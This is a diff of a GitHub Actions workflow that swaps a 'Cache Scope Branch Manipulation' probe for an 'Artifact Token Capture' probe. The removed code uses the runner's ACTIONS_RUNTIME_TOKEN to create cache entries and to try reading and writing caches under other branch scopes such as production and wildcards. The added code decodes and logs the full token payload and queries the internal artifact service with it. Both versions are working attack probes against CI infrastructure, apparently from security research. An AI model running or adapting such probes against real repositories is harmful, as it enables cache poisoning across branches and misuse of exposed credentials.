@@ -1,85 +1,46 @@
-name: Cache Scope Branch Manipulation
+name: Artifact Token Capture
 on:
   workflow_dispatch:
 permissions:
   contents: read
   actions: read
 jobs:
-  scope-branch:
+  capture:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/cache@v4
+      - name: Create test file
+        run: echo "artifact-test-data" > /tmp/test-artifact.txt
+      - uses: actions/upload-artifact@v4
         with:
-          path: /tmp/scope-data
-          key: branch-scope-test-${{ github.run_id }}
+          name: token-capture
+          path: /tmp/test-artifact.txt
       - uses: actions/github-script@v7
         with:
           script: |
-            const crypto = require('crypto');
             const env = process.env;
-            const resultsUrl = env.ACTIONS_RESULTS_URL;
             const token = env.ACTIONS_RUNTIME_TOKEN;
-            const version = crypto.createHash('sha256').update('/tmp/scope-data|zstd').digest('hex');
+            if (!token) { console.log('NO TOKEN'); return; }
             
-            const twirpBase = `${resultsUrl}twirp/github.actions.results.api.v1.CacheService`;
+            // Decode FULL JWT including scp
+            const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
+            console.log('=== FULL JWT payload (post-artifact-upload) ===');
+            console.log(JSON.stringify(payload, null, 2));
+            
+            // Now try the artifact service with this token
+            const resultsUrl = env.ACTIONS_RESULTS_URL;
+            if (!resultsUrl) { console.log('NO RESULTS URL'); return; }
+            
             const headers = { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' };
+            const artBase = `${resultsUrl}twirp/github.actions.results.api.v1.ArtifactService`;
             
-            // First, create a cache entry on our current scope (refs/heads/main)
-            console.log('=== Create cache on own scope ===');
-            const key = `scope-manip-${Date.now()}`;
-            const cr = await fetch(`${twirpBase}/CreateCacheEntry`, {
-              method: 'POST', headers,
-              body: JSON.stringify({key, version})
+            console.log('\n=== ListArtifacts ===');
+            const r1 = await fetch(`${artBase}/ListArtifacts`, {
+              method: 'POST', headers, body: JSON.stringify({})
             });
-            const crData = await cr.json();
-            console.log(`Create: ${cr.status} ok=${crData.ok}`);
+            console.log(`${r1.status}: ${(await r1.text()).substring(0, 300)}`);
             
-            if (crData.ok && crData.signed_upload_url) {
-              await fetch(crData.signed_upload_url, {
-                method: 'PUT',
-                headers: {'Content-Type': 'application/octet-stream', 'x-ms-blob-type': 'BlockBlob'},
-                body: 'SCOPE_TEST_DATA'
-              });
-              await fetch(`${twirpBase}/FinalizeCacheEntryUpload`, {
-                method: 'POST', headers,
-                body: JSON.stringify({key, version, sizeBytes: '15'})
-              });
-            }
-            
-            // Now try to READ with a different scope
-            console.log('\n=== Test: GET with different branch scope ===');
-            const scopes = [
-              {scope: 'refs/heads/main', permission: 3},
-              {scope: 'refs/heads/production', permission: 3},
-              {scope: 'refs/heads/develop', permission: 3},
-              {scope: 'refs/tags/v1.0', permission: 3},
-              {scope: 'refs/pull/1/merge', permission: 3},
-              {scope: '*', permission: 3},
-              {scope: 'refs/heads/*', permission: 3},
-            ];
-            
-            for (const s of scopes) {
-              const r = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
-                method: 'POST', headers,
-                body: JSON.stringify({
-                  key, version,
-                  metadata: {scope: [s]}
-                })
-              });
-              const d = await r.json();
-              console.log(`Scope "${s.scope}": ok=${d.ok} matched=${d.matched_key || 'none'}`);
-            }
-            
-            // Test: Can I CREATE cache on a different branch scope?
-            console.log('\n=== Test: CREATE on different branch scope ===');
-            for (const branch of ['refs/heads/production', 'refs/pull/999/merge']) {
-              const cr2 = await fetch(`${twirpBase}/CreateCacheEntry`, {
-                method: 'POST', headers,
-                body: JSON.stringify({
-                  key: `cross-branch-${Date.now()}`, version,
-                  metadata: {scope: [{scope: branch, permission: 3}]}
-                })
-              });
-              const cr2Data = await cr2.json();
-              console.log(`Create on "${branch}": ok=${cr2Data.ok}`);
-            }
+            console.log('\n=== GetSignedArtifactURL ===');
+            const r2 = await fetch(`${artBase}/GetSignedArtifactURL`, {
+              method: 'POST', headers, body: JSON.stringify({name: 'token-capture'})
+            });
+            console.log(`${r2.status}: ${(await r2.text()).substring(0, 300)}`);
